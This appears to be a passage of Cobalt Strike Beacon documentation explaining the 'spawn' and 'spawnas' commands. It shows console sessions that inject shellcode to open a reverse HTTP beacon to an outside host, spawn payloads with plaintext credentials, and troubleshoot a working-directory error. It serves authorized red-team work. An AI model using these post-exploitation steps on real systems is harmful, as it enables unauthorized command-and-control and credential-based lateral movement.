### spawn <a href="#el_1743085520194_491" id="el_1743085520194_491"></a>

The `spawn` command starts a new process and injects shellcode into it for the specified listener.  The new Beacon will run as the same user who spawned it.

```batch
beacon> help spawn
Use: spawn [x86|x64] [listener]
     spawn [listener]
Spawn an x86 or x64 process and inject shellcode for the listener.
beacon> spawn x64 http
[*] Tasked beacon to spawn (x64) windows/beacon_http/reverse_http (www.bleepincomputer.com:80)
[+] host called home, sent: 350863 bytes
```

### spawnas <a href="#el_1743085527650_504" id="el_1743085527650_504"></a>

The `spawnas` command is similar, but it accepts plaintext credentials for another user.  The new Beacon will run as the alternate user.

```batch
beacon> help spawnas
Use: spawnas [DOMAIN\user] [password] [listener]
Attempt to spawn a payload as another user. If you don't specify DOMAIN,Beacon will try to authenticate as a local user.
This command will usually fail if you're in a SYSTEM context. Use make_token to create a token to pass the desired credentials instead.
```

The help texts are always helpful because they call out any caveats for a command.  The help for spawnas indicates that it probably won't work when run from a Beacon running as SYSTEM.  These restrictions are usually due to the way the underlying Windows APIs behave.

One thing to watch out for when spawning new processes in general is Beacon's current working directory.  For example, this attempt to spawn a new Beacon with alternate credentials fails with the error code 267.

```batch
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
[*] Tasked beacon to spawn windows/beacon_bind_tcp (127.0.0.1:1337) as CONTOSO\rsteel
[-] could not run C:\Windows\system32\rundll32.exe as CONTOSO\rsteel: 267

beacon> windows_error_code 267
ERROR_DIRECTORY, STATUS_NOTIFY_CLEANUP
```

This is caused because Beacon's current working directory is set to a directory owned by pchild's, which rsteel does not have access to.

```batch
beacon> pwd
[*] Current directory is C:\Users\pchilds\Documents
```

The 'fix' for this is simply to change Beacon's working directory to a location rsteel is able to read.

```batch
beacon> cd C:\
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
```
